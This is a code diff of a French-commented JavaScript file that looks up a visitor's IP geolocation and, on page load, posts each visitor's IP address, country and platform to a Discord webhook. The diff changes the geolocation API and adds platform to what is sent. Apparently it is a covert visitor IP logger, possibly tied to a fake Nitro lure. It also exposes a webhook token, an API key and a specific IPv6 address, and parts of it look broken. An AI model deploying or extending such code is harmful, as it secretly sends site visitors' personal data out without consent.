@@ -1,17 +1,30 @@
+function httpGetAsync(url, callback) {
+    const xmlHttp = new XMLHttpRequest();
+    xmlHttp.onreadystatechange = function() {
+        if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
+            callback(xmlHttp.responseText);
+    }
+    xmlHttp.open("GET", url, true); // true for asynchronous
+    xmlHttp.send(null);
+}
 
-              function httpGetAsync(url, callback) {
-                  const xmlHttp = new XMLHttpRequest();
-                  xmlHttp.onreadystatechange = function() {
-                      if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
-                      callback(xmlHttp.responseText);
-                  }
-                  xmlHttp.open("GET", url, true); // true for asynchronous
-                  xmlHttp.send(null);
-              }
+const url = "https://api.ipgeolocation.io/ipgeo?apiKey=9ed8eefc86024c67b341a5ace0b43e1c&ip=2001:861:4282:71d0:b5a4:20d7:e8c3:434c";
 
-              const url = "https://ipgeolocation.abstractapi.com/v1/?api_key=9ed8eefc86024c67b341a5ace0b43e1c&ip_address=2001:861:4282:71d0:b5a4:20d7:e8c3:434c"
+httpGetAsync(url, function(responseText) {
+    const data = JSON.parse(responseText);
+    const country = data.country_name;
+    const platform = data.platform;
+    const city = data.city;
+    const region = data.region;
+    const isp = data.isp;
 
-              httpGetAsync(url)
+    // Utilisez les variables pour afficher les informations dans votre application
+    console.log(`Pays: ${country}`);
+    console.log(`Plateforme: ${platform}`);
+    console.log(`Ville: ${city}`);
+    console.log(`Région: ${region}`);
+    console.log(`Fournisseur d'accès Internet: ${isp}`);
+});
 
 const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
 
@@ -35,7 +48,7 @@ const sendWebhookOnce = async () => {
 
         const embed = {
             title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${country} || **`,
+            description: `**Un nouveau membre a rejoint le site!\nAdresse IP: || ${ipAddress} ||\nPays: || ${country} ||\nPlateforme: || ${platform} ||**`,
             color: 0x00ff00
         };
 
@@ -59,3 +72,4 @@ const sendWebhookOnce = async () => {
 
 // Appelle la fonction au chargement de la page
 sendWebhookOnce();
+// ... (le reste de votre code)
